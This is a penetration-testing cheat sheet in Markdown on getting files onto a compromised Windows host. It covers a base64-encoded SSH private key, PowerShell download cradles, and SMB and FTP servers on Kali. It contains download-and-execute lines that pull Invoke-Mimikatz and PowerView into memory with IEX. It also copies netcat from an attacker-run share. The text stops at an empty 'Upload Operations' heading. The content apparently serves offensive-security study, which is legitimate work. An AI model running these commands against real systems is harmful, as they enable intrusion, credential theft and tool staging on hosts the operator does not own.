# Windows File Transfer

## Download Operations

### Powershell Base64 Encode & Decode

On Kali : 
```
1) Check MD5 hash

$ md5sum id_rsa

2) Encode to Base64, and copy result

$ cat id_rsa |base64 -w 0;echo
```

On Windows target :

```
3) Paste Base64 result in this powershell function to decode it :

[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("[PASTE HERE]"))

4) And confirming the MD5 hash :

Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

### Powershell Web Downloads

On Windows target :

```
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

### SMB Downloads

On Kali, create the smb server with password :
```
$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

On windows target, mount the SMB server : 

```
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

### FTP Downloads

On Kali, create FTP server : 

```
$ sudo pip3 install pyftpdlib
$ sudo python3 -m pyftpdlib --port 21
```

On Windows target, download file : 

```
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

## Upload Operations
